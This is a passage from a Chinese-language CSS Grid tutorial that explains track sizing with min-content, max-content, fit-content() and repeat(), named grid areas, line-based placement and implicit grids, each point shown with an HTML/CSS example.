10%;，如果不考虑边框的话，第一列占据240px，第二列的1fr实际占据0（这个是最后算的），第三列是480px，第四列是80px。\n\n但是如果第二列里有内容，它就不会是0px了。由于第二列的每一项的宽度可能不一致，就需要min-content或max-content来约束。min-content表示内容尽可能窄，对于一段文本来说就是保证最长的单词在一行里，这样会有很多换行。max-content表示内容尽可能宽，对于一段文本来说就是不换行。如果每一列都使用max-content，那很有可能导致网格元素溢出，所以max-content经常搭配minmax(a, b)来使用（但可能会发生重叠）。\n\n<html>\n<head>\n    <style>\n    .grid {\n        display: grid; width: 250px; height: 150px;\n        grid-template-rows: 1fr; border: 1px solid;\n    }\n    #div1 {\n        grid-template-columns:\n            max-content max-content\n            max-content max-content;\n    }\n    #div2 {\n        grid-template-columns:\n            minmax(0, max-content) minmax(0, max-content)\n            minmax(0, max-content) minmax(0, max-content);\n    }\n    .gridlines { border: 1px dashed; }\n    .block {\n        width: 50px; height: 50px;\n        background-color: blue;\n        opacity: 0.5; margin: 10px;\n    }\n    </style>\n</head>\n<body>\n    <div class="grid" id="div1">\n        <div class="gridlines"><div class="block"></div></div>\n        <div class="gridlines"><div class="block" style="width: 100px;"></div></div>\n        <div class="gridlines"><div class="block"></div></div>\n        <div class="gridlines"><div class="block" style="height: 100px;"></div></div>\n    </div>\n    <br>\n    <div class="grid" id="div2">\n        <div class="gridlines"><div class="block"></div></div>\n        <div class="gridlines"><div class="block" style="width: 100px;"></div></div>\n        <div class="gridlines"><div class="block"></div></div>\n        <div class="gridlines"><div class="block" style="height: 100px;"></div></div>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n代码效果图：\n\n\n还可以使用auto，一般要么作为最小值要么作为最大值使用。其实使用auto时，是由align-content和justify-content来决定网格元素尺寸的，在后面几节了会讲。\n\n\n# 3.3 内容适配轨道\n\nmin-content、max-content和minmax(a, b)会比较局限，对每一行内容做不到比较完美的适配。fit-content()函数就比较适合用来适配内容大小的，规范里有这样一个伪公式：fit-content(arg) => min(max-content, max(min-content, arg))，可以理解为取“中间”那个合适的值作为网格尺寸。\n\n<html>\n<head>\n    <style>\n    .grid  {\n        display: grid;\n        grid-template-columns: fit-content(200px) fit-content(200px) fit-content(200px);\n        border: 1px solid;\n    }\n    p { border: 1px dotted; margin: 0; padding: 10px 0; }\n    </style>\n</head>\n<body>\n    <section>\n        <div class="grid">\n            <p>short content, 29 characters.</p>\n            <p>this is longer content, which reaches a total of 63 characters.</p>\n            <p>this is still longer content, going on and on, causing line-wraps and the growth of the row’s height as it makes its way up to 151 characters in total.</p>\n        </div>\n    </section>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n以上代码效果图：\n\n\n<html>\n<head>\n    <style>\n    .grid  {\n        display: grid;\n        grid-template-columns: fit-content(200px) fit-content(200px) fit-content(200px);\n        border: 1px solid;\n    }\n    p { border: 1px dotted; margin: 0; padding: 10px 0; }\n    .img { width: 250px; height: 50px; background-color: blue; }\n    </style>\n</head>\n<body>\n    <section>\n        <div class="grid">\n            <p>short content, 29 characters.</p>\n            <p><img class="img" />this is longer content, which reaches a total of 63 characters.</p>\n            <p>this is still longer content, going on and on, causing line-wraps and the growth of the row’s height as it makes its way up to 151 characters in total.</p>\n        </div>\n    </section>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n以上代码效果图：\n\n\n上面第二个例子中有一个img图像，第二列的min-content就是img的宽度也就是250px，max-content就是一段文本不换行的长度这里应该是非常大的（估计有500px）。又因为fit-content(200px)，可以带入伪公式：fit-content(200px) => min(500px, max(250px, 200px))，最后结果是250px。\n\n\n# 3.4 重复网格线\n\n我们前面的例子每一列的取值基本一样，其实可以使用repeat()函数来简化。比如要设置5个轨道，并且都是50px宽，那么可以.grid { display: grid; grid-template-columns: repeat(5, 50px); }。除了单个单个重复的，还能一系列一系列重复的，比如要设置3个3em-1fr-1fr，那么可以.grid { display: grid; grid-template-columns: repeat(3, 3em 1fr 1fr); }。\n\n<html>\n<head>\n    <style>\n    section {position: relative;}\n    .grid {\n        display: grid; width: 800px; height: 15em;\n        /* grid-template-columns: repeat(3, 3em 1fr 1fr) 3em; 可以平衡两端 */\n        grid-template-columns: repeat(3, 3em 1fr 1fr);\n        grid-template-rows: 1fr; border: 1px solid;\n    }\n    .gridlines { display: grid; border: 1px dashed; }\n    .gridlines i { height: 1.2em; }\n    .gridlines i.col.measure {\n        align-self: center; justify-self: stretch;\n        text-align: center; height: 1.2em;\n    }\n    </style>\n</head>\n<body>\n    <section>\n        <div class="grid boxed lines">\n            <span class="gridlines"><i class="col measure">2em</i></span>\n            <span class="gridlines"><i class="col measure">1fr</i></span>\n            <span class="gridlines"><i class="col measure">1fr</i></span>\n            <span class="gridlines"><i class="col measure">2em</i></span>\n            <span class="gridlines"><i class="col measure">1fr</i></span>\n            <span class="gridlines"><i class="col measure">1fr</i></span>\n            <span class="gridlines"><i class="col measure">2em</i></span>\n            <span class="gridlines"><i class="col measure">1fr</i></span>\n            <span class="gridlines"><i class="col measure">1fr</i></span>\n        </div>\n    </section>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n以上代码效果图：\n\n\n如果网格容器宽度或者高度固定，我们可以使用repeat(auto-fill, xx)自动填充网格，也就是将具体数值替换为auto-fill。这样的写法有个局限就是不能使用在“一系列一系列重复”网格中，也就是只有一个固定尺寸。还可以联合使用比如grid-template-columns: repeat(3, 20em) repeat(auto-fill, 4em);，也可以反过来grid-template-columns: repeat(auto-fill, 4em) repeat(3, 20em);，可以反过来的原因就是始终先算固定尺寸（3个20em），再用剩余空间算自动填充的（剩余的一些4em）。\n\n<html>\n<head>\n    <style>\n    .grid {\n        display: grid; width: 77em; height: 10em; border: 1px solid;\n        grid-template-columns: repeat(auto-fill, 4em) repeat(3, 20em);\n    }\n    span { border: 1px dashed; }\n    </style>\n</head>\n<body>\n    <div class="grid">\n        <span class="gridlines"><i class="col">4em</i></span>\n        <span class="gridlines"><i class="col">4em</i></span>\n        <span class="gridlines"><i class="col">4em</i></span>\n        <span class="gridlines"><i class="col">4em</i></span>\n        <span class="gridlines"><i class="col">20em</i></span>\n        <span class="gridlines"><i class="col">20em</i></span>\n        <span class="gridlines"><i class="col">20em</i></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n以上代码效果图：\n\n\n类似的还有repeat(auto-fit, xx)，与前面的repeat(auto-fill, xx)功能相同都是自动填充网格，区别就是使用auto-fit会剔除不使用的网格轨道（内部没有网格元素）。\n\n<html>\n<head>\n    <style>\n    .grid { display: grid; width: auto; height: 10em; border: 1px solid; }\n    .grid:nth-of-type(1) { grid-template-columns: repeat(auto-fit, 10em); }\n    .grid:nth-of-type(2) { grid-template-columns: repeat(auto-fill, 10em); }\n    span { border: 1px dashed; }\n    .box01 { grid-column: 1; }\n    .box02 { grid-column: 2; }\n    .box03 { grid-column: 4; }\n    .box04 { grid-column: 5; }\n    .box05 { grid-column: 7; }\n\n    p { text-align: center; font: bold 1em consolas, monospace, sans-serif; margin: 1ch;}\n    </style>\n</head>\n<body>\n    <section>\n        <p>repeat(auto-fit, 20em)</p>\n        <div class="grid">\n            <span class="box01">1</span>\n            <span class="box02">2</span>\n            <span class="box03">4</span>\n            <span class="box04">5</span>\n            <span class="box05">7</span>\n        </div>\n        <p>repeat(auto-fill, 20em)</p>\n        <div class="grid">\n            <span class="box01">1</span>\n            <span class="box02">2</span>\n            <span class="box03">4</span>\n            <span class="box04">5</span>\n            <span class="box05">7</span>\n        </div>\n    </section>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n\n# 3.5 网格区域\n\ngrid-template-areas用于给网格划分区域的，直接定义网格区域。可以使用特定的字母或者单词来规定某块区域属于哪一块，比如header、leftside、rightside、centent和footer，也可以使用它们的首字母进行替代。\n\n<html>\n<head>\n    <style>\n    .grid { display: grid;\n            grid-template-areas:\n            "h h h h"\n            "l c c r"\n            "l f f f";\n        grid-template-rows: repeat(3, 3em);\n        border: 1px solid;\n    }\n    span { border: 1px dashed; text-align: center; }\n    .header { grid-area: h; }\n    .leftside { grid-area: l; }\n    .rightside { grid-area: r; }\n    .content { grid-area: c; }\n    .footer { grid-area: f; }\n    </style>\n</head>\n<body>\n    <div class="grid">\n        <span class="box01 header">header</span>\n        <span class="box02 content">content</span>\n        <span class="box03 leftside">leftside</span>\n        <span class="box04 rightside">rightside</span>\n        <span class="box05 footer">footer</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n以上代码效果图：\n\n\n需要注意的一点，grid-template-areas: "h h h h" "l c c r" "l f f f";这样才能跨行，如果是grid-template-areas: "h h h h l c c r l f f f";得到就是一行12列的内容了，不会是三行的内容了。还有，跨行或跨列进行合并区域时，只能是矩形，不然areas模板会失效。比如grid-template-areas: "h h h h" "l c c r" "l l f f";就不会起作用。\n\n网格区域还是需要网格线来约束大小的，可以看下面这个例子。其中空单元格可以使用...或者.来标记\n\n<html>\n<head>\n<style>\n.grid { display: grid;\n    grid-template-areas:\n        "header  header  header  header"\n        "left    ... ... right"\n        "footer  footer  footer  footer";\n    grid-template-columns: 1fr 100px 100px 1fr;\n    grid-template-rows: 40px 100px 40px;\n    border: 1px solid; width: 500px;\n}\nspan { border: 1px dashed; }\n.header { grid-area: header; }\n.leftside { grid-area: left; }\n.rightside { grid-area: right; }\n.content { grid-area: content; }\n.footer { grid-area: footer; }\n</style>\n</head>\n<body>\n    <div class="grid boxed lines small">\n        <span class="header">header</span>\n        <span class="leftside">left</span>\n        <span class="rightside">right</span>\n        <span class="footer">footer</span>\n        <span class="gridlines"></span>\n        <span class="gridlines"></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n以上代码效果图：\n\n\n给网格区域命名后，会自动给区域首尾的网格线命名了。比如header区域，第一行网格线和第一列网格线的名字都是header-start，第二行网格线和第二列网格线的名字都是header-end\n\n\n\n\n# 四、添加网格元素\n\n\n# 4.1 附加到网格线上\n\n将元素附加到网格线上有四个属性grid-row-start、grid-row-end、grid-column-start和grid-column-end，可以理解为给元素的边界限定范围\n\n<html>\n<head>\n<style>\n    .grid { display: grid; width: 50em; height: 25em;\n        grid-template-row: repeat(3, 5em); grid-template-columns: repeat(3, 5em); }\n    .box01 { grid-row-start: 2; grid-row-end: 4;\n        grid-column-start: 1; grid-column-end: 3; background: skyblue; }\n    .box02 { grid-row-start: 1; grid-row-end: 3;\n        grid-column-start: 4; grid-column-end: 7; background: gray; }\n    .box03 { grid-row-start: 2; grid-row-end: 3;\n        grid-column-start: 8; grid-column-end: 9; background: yellow; }\n    span { border: 1px dashed; }\n    span[class*="box"] { z-index: 1; }\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines">\n        <span class="box01">1</span><span class="box02">2</span><span class="box03">3</span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n以上代码效果图：\n\n\n还有一种类似的方式，给它指定跨网格轨道的数量，比如grid-column-start: 3; grid-column-end: span 2;从第三个列线开始往end方向跨2个span。其中span后面的数值要是正整数，或者省略就是默认为1。如果是grid-column-start: span 2; grid-column-end: 3;，已第三列线为结束边界，往start方向跨2个span（也就是第1列线的位置）。\n\n<html>\n<head>\n<style>\n    #grid { display: grid;  width: 50em; height: 25em;\n        grid-rows: repeat(4, 2em); grid-columns: repeat(5, 5em);}\n    .box01 { grid-row: 1; grid-column-start: 3; grid-column-end: span 2; background: skyblue; }\n    .box02 { grid-row: 2; grid-column-start: span 2; grid-column-end: 3; background: gray; }\n    .box03 { grid-row: 3; grid-column-start: 1; grid-column-end: span 5; background: yellow; }\n    .box04 { grid-row: 4; grid-column-start: span 1; grid-column-end: 5; background: green; }\n    span { border: 1px dashed; }\n    span[class*="box"] { z-index: 1; }\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines" id="grid">\n        <span class="box01">1</span><span class="box02">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n以上代码效果图：\n\n\n添加元素引用网格线时，并不限于使用编号，网格名称也是可以使用的，混用也可以。可以看下面的例子，r 2、col-a 3和col-a -2是编号和名称混用的场景，编号是可以使用负数的，它表示从网格右侧往左计数(尾端反向计数，尾端-1就是最后一个)，那么col-a -2的意思是从右往左数第2个col-a。\n\n<html>\n<head>\n<style>\n    body {width: 64em; padding: 5em; margin: 1px;}\n    #grid {display: grid; width: 54em;\n        grid-template-rows: repeat(5, [r] 4em);\n        grid-template-columns: 2em repeat(5, [col-a] 5em [col-b] 5em);}\n    .one { grid-row-start: r 2; grid-row-end: 4;\n        grid-column-start: col-b; grid-column-end: span 2; background: skyblue; }\n    .two { grid-row-start: r; grid-row-end: span r 2;\n        grid-column-start: col-a 3; grid-column-end: span 2 col-a; background: gray; }\n    .three { grid-row-start: 4; grid-column-start: col-a -2; background: yellow; }\n\n    span[class*="box"] {z-index: 1;}\n    span { border: 1px dashed; }\n\n    .labels#col {display: grid; grid-template-rows: 5em; grid-template-columns: 2em repeat(5, [col-a] 5em [col-b] 5em) 2em 2em;}\n    .labels#row {display: grid; grid-template-rows: repeat(6, [r] 4em); grid-template-columns: 5em;}\n\n    .labels#col {position: absolute; top: 0; left: 5em; margin: 0; padding: 1px;}\n    .labels#row {position: absolute; top: 5em; left: 0; margin: 0; padding: 1px;}\n\n    .labels#col li {display: flex; justify-content: flex-end; align-items: flex-start; flex-flow: column;}\n    .labels#row li {display: flex; justify-content: flex-end; align-items: flex-start; flex-flow: row;}\n\n    .labels li.line.label i {color: rebeccapurple; font: 1em arvo, sans-serif;}\n    .labels#col li.line.label i {border-left: 1px solid; padding-left: 0.25em;}\n    .labels#col li i:last-child {padding-bottom: 0.5em;}\n    .labels#col li.high i:last-child {padding-bottom: 4em;}\n\n    .labels .line.col.label  {grid-template-row: 1; grid-template-column: auto / span 1;}\n\n    .labels li.line.label i {color: rebeccapurple; font: 1em arvo, sans-serif;}\n    .labels#col li.line.label i {border-left: 1px solid; padding-left: 0.25em;}\n    .labels#row li.line.label i {border-top: 1px solid; padding-top: 0.25em;}\n\n    .labels#row li i {padding-right: 0.5em;}\n    .labels#col li i:last-child {padding-bottom: 0.5em;}\n    .labels#col li.high i:last-child {padding-bottom: 4em;}\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines" id="grid">\n        <span class="box01 one">1</span><span class="box02 two">2</span><span class="box03 three">3</span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines">\n    </div>\n    <ul class="labels" id="col">\n        <li class="col line label"><i>1</i></li>\n        <li class="col line label"><i>col-a</i><i>2</i></li>\n        <li class="col line label"><i>col-b</i><i>3</i></li>\n        <li class="col line label"><i>col-a</i><i>4</i></li>\n        <li class="col line label"><i>col-b</i><i>5</i></li>\n        <li class="col line label"><i>col-a</i><i>6</i></li>\n        <li class="col line label"><i>col-b</i><i>7</i></li>\n        <li class="col line label"><i>col-a</i><i>8</i></li>\n        <li class="col line label"><i>col-b</i><i>9</i></li>\n        <li class="col line label"><i>col-a</i><i>10</i></li>\n        <li class="col line label"><i>col-b</i><i>11</i></li>\n        <li class="col line label"><i>12</i></li>\n    </ul>\n    <ul class="labels" id="row">\n        <li class="row line label"><i></i><i>1</i></li>\n        <li class="row line label"><i>r</i><i>2</i></li>\n        <li class="row line label"><i>r</i><i>3</i></li>\n        <li class="row line label"><i>r</i><i>4</i></li>\n        <li class="row line label"><i>r</i><i>5</i></li>\n    </ul>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n\n\n以上代码效果图：\n\n\n我们可以使用grid-row和grid-column来简写前面提到的四个属性（grid-row-start、grid-row-end、grid-column-start和grid-column-end），需要斜线/来分隔start和end。像这一小节开头的例子可以简写改成以下例子：\n\n<html>\n<head>\n<style>\n    .grid { display: grid; width: 50em; height: 25em;\n        grid-template-row: repeat(3, 5em); grid-template-columns: repeat(3, 5em); }\n    .box01 { grid-row: 2 / 4; grid-column: 1 / 3; background: skyblue; }\n    .box02 { grid-row: 1 / 3; grid-column: 4 / 7; background: gray; }\n    .box03 { grid-row: 2 / 3; grid-column: 8 / 9; background: yellow; }\n    span { border: 1px dashed; }\n    span[class*="box"] { z-index: 1; }\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines">\n        <span class="box01">1</span><span class="box02">2</span><span class="box03">3</span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n以上代码效果图：\n\n\n\n# 4.2 隐式网格\n\n前面的例子都是使用grid-template-xxx定义的显示网格，在添加元素时一般都在这些网格中，如果万一我们添加的元素超出了这些网格，浏览器会怎么处理？浏览器会自动创建对应的行线或列线。\n\n<html>\n<head>\n<style>\n    #grid { grid-auto-rows: 2em; grid-auto-columns: 5em; width: 35em; }\n    #grid { display: grid; grid-template-rows: 2em 2em;\n        grid-template-columns: repeat(6, 4em); }\n    .box01 { grid-column: 1; grid-row: 1 / 4; border: 5px solid; border-color: skyblue; }\n    .box02 { grid-column: 2; grid-row: 3 / span 2; border: 5px solid; border-color: springgreen; }\n    .box03 { grid-column: 3; grid-row: span 2 / 3; border: 5px solid; border-color: salmon; }\n    .box04 { grid-column: 4; grid-row: span 4 / 5; border: 5px solid; border-color: hotpink; }\n    .box05 { grid-column: 5; grid-row: span 6 / 5; border: 5px solid; border-color: lawngreen; }\n    .box06 { grid-column: 6; grid-row: -1 / span 3; border: 5px solid; border-color: orangered; }\n    .box07 { grid-column: 7; grid-row: span 3 / -1; border: 5px solid; border-color: yellowgreen; }\n    span { border: 1px dashed; }\n    span[class*="box"] {z-index: 1;}\n    span.explicit {background: #ddd; grid-area: 1 / 1 / 3 / 7;}\n</style>\n</head>\n<body>\n    <div class="grid gridlines" id="grid">\n        <span class="box01">1</span><span class="box02">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="box06">6</span>\n        <span class="box07">7</span><span class="explicit"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n以上代码效果图：\n\n\n我们可以看到上面这个例子，显示规划了两行六列的网格，7个span中只有第3个没有超出，其他都超出了，浏览器自动为它们添加了行线或列线。值得注意的是第6个和第7个的-1指的是显示网格中尾端反向的网格线（这里就是首端正向第3条行线）。\n\n前面的网格线都没有具体的名称，如果有具体的名称情况与上面的类似，主要就是在扩展隐式网格时还能为隐式网格线添加名字。比如下面这个例子中的box01，从2开始往下跨span类型的网格，要跨2条名称为end的网格线，但显示网格中只有一条end网格线，然后浏览器隐式生成一条end网格线（在下图中是斜体的）。同样box02，从2开始往下跨span类型的网格，要跨1条名称为final的网格线，但显示网格中没有，那将之前的隐式end网格线又新添一个名字final。后面的box03、box04和box05都是如此。\n\n<html>\n<head>\n<style>\n    body {width: 64em; padding-left: 8.4em; padding-top: 1em; margin: 1px;}\n    #grid {grid-auto-rows: 2em; grid-auto-columns: 5em; width: 35em; left: 5em; }\n    #grid {display: grid; grid-template-rows: [begin] 2em [middle] 2em [end];\n        grid-template-columns: repeat(5, 5em); }\n    .box01 { grid-column: 1; grid-row: 2 / span end 2; border: 5px solid; border-color: skyblue; }\n    .box02 { grid-column: 2; grid-row: 2 / span final; border: 5px solid; border-color: springgreen; }\n    .box03 { grid-column: 3; grid-row: 1 / span 3 middle; border: 5px solid; border-color: salmon; }\n    .box04 { grid-column: 4; grid-row: span begin 2 / end; border: 5px solid; border-color: hotpink; }\n    .box05 { grid-column: 5; grid-row: span 2 middle / begin; border: 5px solid; border-color: lawngreen; }\n    span { border: 1px dashed; }\n    span[class*="box"] {z-index: 1;}\n    span.explicit {background: #ddd; grid-area: 1 / 1 / 3 / 6;}\n\n    .labels#row {display: grid; grid-template-rows: repeat(7, 2em);}\n    .labels#row {position: absolute; top: 1em; left: 0; margin: 0; padding: 1px;}\n    .labels#row li {display: flex; justify-content: flex-end; align-items: flex-start; flex-flow: row;}\n\n    .labels li.line.label i {color: rebeccapurple; font: 1em arvo, sans-serif;}\n    .labels li.line.label.implicit i { font-style: italic; }\n    .labels#row li.line.label i {border-top: 1px solid; padding-top: 0.25em;}\n    .labels#row li i {padding-right: 0.5em;}\n    .labels li i::after { content: " || "; margin-right: 4px; }\n    .labels li i:last-child::after { content: ""; }\n</style>\n</head>\n<body>\n    <div class="grid gridlines" id="grid">\n        <span class="box01">1</span><span class="box02">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="explicit"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span><span class="gridlines"></span><span class="gridlines"></span>\n        <span class="gridlines"></span>\n    </div>\n    <ul class="labels" id="row">\n        <li class="row line label implicit"><i>middle</i></li>\n        <li class="row line label implicit"><i>begin</i><i>middle</i></li>\n        <li class="row line label"><i>begin</i><i>1</i></li>\n        <li class="row line label"><i>middle</i><i>2</i></li>\n        <li class="row line label"><i>end</i><i>3</i></li>\n        <li class="row line label implicit"><i>final</i><i>middle</i></li>\n        <li class="row line label implicit"><i>middle</i></li>\n    </ul>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n\n\n以上代码效果图：\n\n\n我们并没讲隐式添加的网格的尺寸为什么和显式的一样，因为上面的例子都使用了grid-auto-rows或grid-auto-columns来约束隐式网格尺寸，如果不使用这两个属性，那么新添的行的高度会根据这一行的内容高度作为最终高度，新添加的列的宽度会根据这一列的内容宽度作为最终宽度。这个同样也应用于网格流中，看下面这个例子。\n\n<html>\n<head>\n<style>\n    .grid {display: inline-grid; vertical-align: top; margin-right: 3em;\n        grid-template-rows: 120px 120px; grid-template-columns: 120px 120px;}\n    #g1 {grid-auto-rows: 120px;}\n    span[class*="box"] { font-size: 1.5em; border: 5px solid; }\n    *[class*="01"] { color: hsl(0,67%,50%); background: hsla(0,67%,50%,0.2); border-color: skyblue; }\n    *[class*="02"] { color: hsl(24,67%,50%); background: hsla(24,67%,50%,0.2); border-color: salmon; }\n    *[class*="03"] { color: hsl(48,67%,50%); background: hsla(48,67%,50%,0.2); border-color: hotpink; }\n    *[class*="04"] { color: hsl(72,67%,50%); background: hsla(72,67%,50%,0.2); border-color: lawngreen; }\n    *[class*="05"] { color: hsl(96,67%,50%); background: hsla(96,67%,50%,0.2); border-color: blueviolet; }\n    *[class*="06"] { color: hsl(120,67%,50%); background: hsla(120,67%,50%,0.2); border-color: burlywood; }\n</style>\n</head>\n<body>\n    <div class="grid boxed gridlines" id="g1">\n        <span class="box01">1</span><span class="box02">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="box06">6</span>\n    </div>\n    <div class="grid boxed gridlines" id="g2">\n        <span class="box01">1</span><span class="box02">2</span><span class="box03">3</span>\n        <span class="box04">4</span><span class="box05">5</span><span class="box06">6</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n以上代码效果图：\n\n\n\n# 4.3 附加到网格区域中\n\n事先定义好网格区域，直接使用grid-area可以将元素添加到网格区域中。其实在网格区域这节的例子里就使用了grid-area，如下。\n\n<html>\n<head>\n    <style>\n    .grid { display: grid;\n            grid-template-areas:\n            "h h h h"\n            "l c c r"\n            "l f f f";\n        grid-template-rows: repeat(3, 3em);\n        border: 1px solid;\n    }\n    span { border: 1px dashed; text-align: center; }\n    .header { grid-area: h; }\n    .leftside { grid-area: l; }\n    .rightside { grid-area: r; }\n    .content { grid-area: c; }\n    .footer { grid-area: f; }\n    </style>\n</head>\n<body>\n    <div class="grid">\n        <span class="box01 header">header</span>\n        <span class="box02 content">content</span>\n        <span class="box03 leftside">leftside</span>\n        <span class="box04 rightside">rightside</span>\n        <span class="box05 footer">footer</span>\n    </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n以上代码效果图：\n\n\n以上只是grid-area为一个值的场景，有些场景下它有4个值并用/分隔。比如下面例子中的grid-area: 1 / 1 / 2 / 2，就是上 / 左 / 下 / 右的网格线顺序，与css属性的上右下左是反的。\n\n<html>\n<head>\n<style>\n    #grid { width: 400px; height: 150px; }\n    #grid {display: inline-grid;\n        grid-template-rows:\n            [r1-start] 1fr [r1-end r2-start] 2fr [r2-end];\n        grid-template-columns:\n            [col-start] 1fr [col-end main-start] 1fr [main-end];}\n    .box01 {grid-area: r1 / main / r1 / main; border: 5px solid; border-color: skyblue; }\n    .box02 { grid-area: r2-start / col-start / r2-end / main-end;\n        border: 5px solid; border-color: springgreen; }\n    .box03 {grid-area: 1 / 1 / 2 / 2; border: 5px solid; border-color: salmon; }\n    span { border: 1px dashed; text-align: center; }\n    ul li { display: flex; }\n    ul li i { color: rebeccapurple; }\n    .labels1 { display: grid; grid-template-columns: 1fr 1fr 1fr;\n        width: 600px; padding: 0; margin-bottom: 0; margin-left: 160px; }\n    .labels1 li { justify-content: flex-end; 